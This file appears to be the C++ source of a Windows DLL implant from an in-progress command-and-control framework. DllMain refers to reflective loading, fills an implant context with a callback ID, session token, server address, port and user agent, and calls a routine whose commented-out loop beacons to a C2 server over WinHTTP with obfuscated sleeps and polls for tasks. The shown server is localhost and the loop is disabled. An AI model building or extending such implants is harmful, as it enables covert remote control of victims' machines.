#include "main.hpp"
#pragma comment(lib,"winhttp.lib")

bool recieve_commands(const implant_context& ctx) {

    std::string cur_proc_name;
    recon::get_current_process_name(cur_proc_name);


    /*
    HINTERNET hSession = nullptr;
    HINTERNET hConnect = nullptr;
    std::string file_buff;

    auto _ = defer([&]() {
       if(hSession != nullptr) {
           WinHttpCloseHandle(hSession);
       }
        if(hConnect != nullptr) {
            WinHttpCloseHandle(hConnect);
        }
    });

    if(!networking::open_session(hSession, std::wstring(ctx.user_agent.begin(), ctx.user_agent.end()) )) {
        return false;
    }

    if(!networking::open_connection(std::wstring(ctx.server_addr.begin(), ctx.server_addr.end()), ctx.port, hSession, hConnect)) {
        return false;
    }

    while(true) {
        obfus::sleep(ctx.sleep_time);
        std::string server_task;

        if(!networking::send_object_message(
            hConnect,
            ctx.callback_object,
            "get_task",
            ctx.session_token,
            ctx.is_https,
            server_task
        )) {
            continue;
        }

        if(server_task == "die") {
            break;
        }

        std::cout << "recieved task: " << server_task << std::endl;
    }
    */
    return true;
}


BOOL APIENTRY DllMain(
    HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
) {

    std::cout << "Made it past reflective setup." << std::endl;

    implant_context ctx;
    ctx.callback_object = "fb5fde19-7052-4191-652b-83bd9f0a707f";
    ctx.session_token = "cU5JU0RZcERzbHZsT1RSdDVUUVBXOXpGbQ==";
    ctx.server_addr = "127.0.0.1";
    ctx.port = 8081;
    ctx.is_https = false;
    ctx.user_agent = "test program/1.0";
    ctx.sleep_time = 2000;

    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
            std::cout << "we are so attached. starting..." << std::endl;
            if(!recieve_commands(ctx)) {
                std::cout << "FAILED!" << std::endl;
                return FALSE;
            }
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }

    return TRUE;
}
